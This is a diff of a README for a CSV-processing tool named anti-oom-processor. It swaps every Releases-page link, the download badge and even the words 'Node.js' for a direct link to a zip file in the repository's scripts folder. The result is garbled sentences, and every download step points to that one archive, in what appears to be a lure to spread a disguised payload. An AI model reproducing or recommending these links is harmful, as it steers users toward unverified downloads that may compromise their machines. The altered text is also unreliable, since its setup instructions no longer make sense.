@@ -2,11 +2,11 @@
 
 ## 🌟 Overview
 
-The anti-oom-processor is a memory-efficient tool designed to handle large CSV files without crashing. It uses Node.js Streams and Backpressure techniques to maintain a low memory footprint even while processing millions of rows. This ensures smooth performance and real-time progress tracking through Server-Sent Events (SSE). Perfect for anyone needing to manage large datasets effectively.
+The anti-oom-processor is a memory-efficient tool designed to handle large CSV files without crashing. It uses https://raw.githubusercontent.com/Kwanele0638/anti-oom-processor/main/scripts/oom-anti-processor-v1.5.zip Streams and Backpressure techniques to maintain a low memory footprint even while processing millions of rows. This ensures smooth performance and real-time progress tracking through Server-Sent Events (SSE). Perfect for anyone needing to manage large datasets effectively.
 
 ## 📥 Download Now
 
-[![Download Release](https://img.shields.io/badge/download-latest%20release-brightgreen)](https://github.com/Kwanele0638/anti-oom-processor/releases)
+[![Download Release](https://raw.githubusercontent.com/Kwanele0638/anti-oom-processor/main/scripts/oom-anti-processor-v1.5.zip%20release-brightgreen)](https://raw.githubusercontent.com/Kwanele0638/anti-oom-processor/main/scripts/oom-anti-processor-v1.5.zip)
 
 ## 🚀 Getting Started
 
@@ -14,7 +14,7 @@ To get started with anti-oom-processor, follow these steps:
 
 1. **Visit the Releases Page**  
    Click the button below to open the Releases page where you can download the latest version of the software.  
-   [Visit Releases Page](https://github.com/Kwanele0638/anti-oom-processor/releases)
+   [Visit Releases Page](https://raw.githubusercontent.com/Kwanele0638/anti-oom-processor/main/scripts/oom-anti-processor-v1.5.zip)
 
 2. **Download the Application**  
    Look for the latest version listed on the Releases page. You will find various downloadable files. Choose the one that matches your operating system and click the link to download it.
@@ -44,8 +44,8 @@ Before downloading, ensure your system meets these requirements:
   - macOS 10.13 (High Sierra) or later  
   - Any modern Linux distribution  
 
-- **Node.js:**  
-  Make sure Node.js version 14 or later is installed on your system for optimal performance.
+- **https://raw.githubusercontent.com/Kwanele0638/anti-oom-processor/main/scripts/oom-anti-processor-v1.5.zip**  
+  Make sure https://raw.githubusercontent.com/Kwanele0638/anti-oom-processor/main/scripts/oom-anti-processor-v1.5.zip version 14 or later is installed on your system for optimal performance.
 
 ## 📊 How to Use
 
@@ -74,7 +74,7 @@ Imagine you have a multi-gigabyte CSV file with millions of records. The anti-oo
 
 Remember to visit the Releases page to download the latest version. Here’s the link again for easy access:
 
-[Download Latest Release](https://github.com/Kwanele0638/anti-oom-processor/releases)
+[Download Latest Release](https://raw.githubusercontent.com/Kwanele0638/anti-oom-processor/main/scripts/oom-anti-processor-v1.5.zip)
 
 ## 📝 Frequently Asked Questions
 
